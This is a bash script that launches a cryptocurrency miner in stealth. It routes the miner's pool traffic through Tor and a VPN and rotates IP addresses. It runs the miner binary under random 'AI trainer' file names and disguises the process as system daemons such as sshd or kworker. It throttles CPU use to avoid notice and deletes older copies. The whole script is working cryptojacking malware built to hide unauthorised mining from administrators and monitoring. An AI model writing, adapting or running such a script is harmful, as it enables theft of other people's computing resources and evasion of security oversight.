#!/bin/bash

# Start Tor, Privoxy, and VPN services
service tor restart
if ! pgrep -x "tor" > /dev/null; then
  echo "Tor service failed to start"
  exit 1
fi

service privoxy start
if ! pgrep -x "privoxy" > /dev/null; then
  echo "Privoxy service failed to start"
fi

openvpn --config $VPN_CONFIG &
if ! pgrep -x "openvpn" > /dev/null; then
  echo "OpenVPN service failed to start"
fi

# Start IP changing script
if [ -f /root/change_ip.sh ]; then
  /root/change_ip.sh &
fi

# Clean up old processes
if [ -f /usr/sbin/$(cat /root/model.txt) ]; then
  echo "Removing old process: $(cat /root/model.txt)"
  rm -f /usr/sbin/$(cat /root/model.txt)
fi

# Process masking and renaming
SYSTEM_PROCESS_NAMES=("systemd" "sshd" "cron" "bash" "kworker" "dbus-daemon")
RANDOM_SYSTEM_PROCESS=${SYSTEM_PROCESS_NAMES[$RANDOM % ${#SYSTEM_PROCESS_NAMES[@]}]}

AI_PROCESS_NAMES=("ai_trainer" "deep_learning_worker" "neural_net" "model_optimizer" "tensor_processor" "gpu_trainer")
RANDOM_AI_NAME=${AI_PROCESS_NAMES[$RANDOM % ${#AI_PROCESS_NAMES[@]}]}
RANDOM_NUMBER=$(shuf -i 1000-9999 -n 1)

FINAL_NAME="${RANDOM_AI_NAME}-${RANDOM_NUMBER}"
echo $FINAL_NAME > /root/model.txt
cp /usr/sbin/systemdd /usr/sbin/$FINAL_NAME

# CPU and core allocation
TOTAL_CORES=$(nproc)
cpu_hint=$(shuf -i $CPU_MIN-$CPU_MAX -n 1)
CPU_HINT=$(echo "($TOTAL_CORES * $cpu_hint) / 100" | bc)

CORE_SET=$(seq -s, 0 $(($TOTAL_CORES - 1)))

# CPU limiting
TOTAL_SYSTEM_POWER=$(($TOTAL_CORES * 100))
CPU_LIMIT_PERCENT=$(shuf -i 50-90 -n 1)
CPU_LIMIT=$(($TOTAL_SYSTEM_POWER * $CPU_LIMIT_PERCENT / 100))

# Start systemdd with the new name
sudo -u nobody exec -a "$RANDOM_SYSTEM_PROCESS" cpulimit -l $CPU_LIMIT -- taskset -c $CORE_SET torsocks /usr/sbin/$FINAL_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages --cpu-max-threads-hint=$CPU_HINT --tls --proxy=socks5://127.0.0.1:9050

# Keep the process running
tail -f /dev/null
